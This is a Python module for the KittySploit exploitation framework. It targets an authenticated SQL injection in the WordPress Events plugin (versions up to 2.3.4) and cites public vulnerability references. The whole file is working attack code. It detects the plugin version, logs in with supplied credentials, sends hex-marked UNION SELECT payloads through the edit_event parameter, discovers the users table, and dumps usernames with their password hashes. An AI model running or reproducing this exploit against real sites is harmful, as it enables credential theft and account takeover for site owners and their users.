from urllib.parse import urlencode
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.http_login import Http_login
from lib.protocols.http.wordpress import Wordpress
from core.output_handler import print_table


class Module(Auxiliary, Http_client, Http_login, Wordpress):
    __info__ = {
        "name": "WordPress Events <= 2.3.4 Authenticated Hash Dump",
        "description": (
            "The WordPress Events plugin <= 2.3.4 contains an authenticated SQL injection "
            "in the event editing workflow. Any user able to manage events can abuse it to "
            "extract WordPress password hashes from the database."
        ),
        "author": [
            "Lenon Leite",
            "rastating",
            "KittySploit Team",
        ],
        "references": [
            "https://wpscan.com/vulnerability/8954/",
            "http://lenonleite.com.br/en/blog/2017/11/03/wp-events-2-3-4-wordpress-plugin-sql-injetcion/",
        ],
        "cve": "",
        "tags": ["wordpress", "sqli", "hashdump", "authenticated"],
    }

    username = OptString("", "WordPress username with permission to manage events", required=True)
    password = OptString("", "WordPress password", required=True)
    max_users = OptInteger(25, "Maximum number of users to dump", required=True, advanced=True)

    _MARKER_START = "kittystart"
    _MARKER_END = "kittyend"
    _VISIBLE_COLUMN_INDEX = 1
    _NUMBER_OF_COLUMNS = 14

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.path)

    def _plugin_readme_path(self) -> str:
        return self.wp_plugin_path(self._wp_base(), "wp-events", "readme.txt")

    def _login_path(self) -> str:
        return f"{self._wp_base()}/wp-login.php"

    def _admin_events_path(self) -> str:
        return f"{self._wp_base()}/wp-admin/admin.php"

    def _is_vulnerable_version(self, version: str) -> bool:
        try:
            return self.wp_version_to_tuple(version) <= (2, 3, 4)
        except Exception:
            return False

    def _extract_marker_value(self, text: str):
        pattern = rf"{self._MARKER_START}(.*?){self._MARKER_END}"
        match = re.search(pattern, text or "", flags=re.IGNORECASE | re.DOTALL)
        if not match:
            return None
        return re.sub(r"<[^>]+>", "", match.group(1)).strip()

    def _build_union_payload(self, expression: str) -> str:
        wrapped = (
            f"CONCAT(0x{self._MARKER_START.encode().hex()},"
            f"IFNULL(CAST(({expression}) AS CHAR),0x20),"
            f"0x{self._MARKER_END.encode().hex()})"
        )
        columns = ["NULL"] * self._NUMBER_OF_COLUMNS
        columns[self._VISIBLE_COLUMN_INDEX - 1] = wrapped
        nonce = "".join("0123456789"[ord(ch) % 10] for ch in self.random_text(3))
        return f"-{nonce} UNION ALL SELECT {','.join(columns)} #"

    def _authenticated_request(self, sqli_expression: str):
        params = {
            "page": "wp-events-edit",
            "edit_event": self._build_union_payload(sqli_expression),
        }
        path = f"{self._admin_events_path()}?{urlencode(params)}"
        return self.http_request(
            method="GET",
            path=path,
            allow_redirects=True,
            timeout=15,
        )

    def _run_scalar_query(self, expression: str):
        response = self._authenticated_request(expression)
        if not response:
            return None
        return self._extract_marker_value(response.text or "")

    def _wordpress_login(self) -> bool:
        try:
            self.http_request(method="GET", path=self._login_path(), allow_redirects=True, timeout=10)
            self.set_cookie("wordpress_test_cookie", "WP Cookie check")

            response = self.http_request(
                method="POST",
                path=self._login_path(),
                data={
                    "log": self.username,
                    "pwd": self.password,
                    "wp-submit": "Log In",
                    "redirect_to": f"{self._wp_base()}/wp-admin/",
                    "testcookie": "1",
                },
                allow_redirects=True,
                timeout=15,
                session=True,
            )
        except Exception as e:
            print_error(f"WordPress login request failed: {e}")
            return False

        if not response:
            print_error("No response from WordPress login endpoint")
            return False

        body = (response.text or "").lower()
        if "login_error" in body or "incorrect" in body or "invalid username" in body:
            print_error("WordPress authentication failed")
            return False

        cookies = self.get_cookies()
        if any(name.startswith("wordpress_logged_in") for name in cookies):
            print_success("Authenticated to WordPress")
            return True

        effective_path = self.response_effective_path(self._login_path(), response)
        if "/wp-admin/" in effective_path:
            print_success("Authenticated to WordPress")
            return True

        print_error("Could not confirm WordPress authentication")
        return False

    def _discover_users_table(self):
        return self._run_scalar_query(
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=database() AND table_name LIKE '%\\\\_users' ESCAPE '\\\\' "
            "ORDER BY table_name LIMIT 0,1"
        )

    def _fetch_user_count(self, users_table: str) -> int:
        raw = self._run_scalar_query(f"SELECT COUNT(*) FROM {users_table}")
        if raw is None:
            return 0
        try:
            return int(raw)
        except ValueError:
            return 0

    def _fetch_user_row(self, users_table: str, offset: int):
        row = self._run_scalar_query(
            "SELECT CONCAT_WS(0x3a,user_login,user_pass) "
            f"FROM {users_table} ORDER BY ID LIMIT {offset},1"
        )
        if not row or ":" not in row:
            return None
        username, password_hash = row.split(":", 1)
        return username.strip(), password_hash.strip()

    def check(self):
        try:
            response = self.http_request(method="GET", path=self._plugin_readme_path(), timeout=10)
        except Exception as e:
            return {"vulnerable": False, "reason": f"Readme request failed: {e}", "confidence": "low"}

        if not response or response.status_code != 200:
            return {"vulnerable": False, "reason": "Events plugin readme not accessible", "confidence": "low"}

        version = self.wp_extract_version_from_readme(response.text or "")
        if not version:
            return {"vulnerable": False, "reason": "Unable to determine Events plugin version", "confidence": "low"}

        if not self._is_vulnerable_version(version):
            return {
                "vulnerable": False,
                "reason": f"Events version {version} appears patched (> 2.3.4)",
                "confidence": "high",
            }

        return {
            "vulnerable": True,
            "reason": f"Events version {version} is within the vulnerable range",
            "confidence": "high",
        }

    def run(self):
        print_status(f"Checking Events plugin version on {self.target}:{self.port}...")
        check_result = self.check()
        if not check_result.get("vulnerable"):
            print_error(check_result.get("reason", "Target does not appear vulnerable"))
            return False

        print_success(check_result["reason"])

        if not self._wordpress_login():
            return False

        print_status("Confirming SQL injection behavior...")
        probe = self._run_scalar_query("SELECT 1337")
        if probe != "1337":
            print_error("Authenticated request did not return the expected SQLi probe marker")
            return False

        users_table = self._discover_users_table()
        if not users_table:
            print_error("Unable to discover the WordPress users table name")
            return False

        print_success(f"Discovered users table: {users_table}")

        user_count = self._fetch_user_count(users_table)
        if user_count <= 0:
            print_error("Could not determine the number of users to dump")
            return False

        limit = min(user_count, int(self.max_users))
        print_status(f"Dumping {limit} user hash(es) out of {user_count}...")

        dumped = []
        for offset in range(limit):
            row = self._fetch_user_row(users_table, offset)
            if not row:
                print_warning(f"Failed to extract row {offset}")
                continue
            dumped.append([row[0], row[1]])
            print_success(f"Dumped hash for user: {row[0]}")

        if not dumped:
            print_error("No hashes were extracted")
            return False

        print_table(["Username", "Password Hash"], dumped)
        print_success(f"Extracted {len(dumped)} credential hash(es)")
        return True
